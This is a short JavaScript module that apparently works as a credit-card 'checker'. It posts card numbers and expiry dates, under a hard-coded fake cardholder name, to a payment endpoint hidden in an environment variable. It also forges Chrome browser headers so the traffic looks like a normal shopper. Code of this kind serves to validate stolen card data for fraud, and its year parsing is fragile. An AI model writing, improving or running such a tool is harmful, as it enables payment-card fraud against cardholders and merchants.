import axios from "axios"
import "dotenv/config";
export const validCc = async (ccNumber, ccMonth, ccYear) => {
    let Year = ccYear.split("0")[1]
    console.log(ccNumber, ccMonth, Year)
    try {
        let results = await axios.post(
            process.env.URL_CHK,
            `pan=${ccNumber}&month=${ccMonth}&year=${Year}&holderName=debora%20silva`,
            {
                headers: {
                    'sec-ch-ua-platform': '"Windows"',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'Content-Type': 'text/plain;charset=UTF-8',
                    'sec-ch-ua-mobile': '?0',
                    'Accept': '*/*',
                    'Sec-Fetch-Site': 'same-site',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }
            }
        );

        return results.data
    } catch (error) {
        console.error(error.response.data);

        return error.response.data
    }
};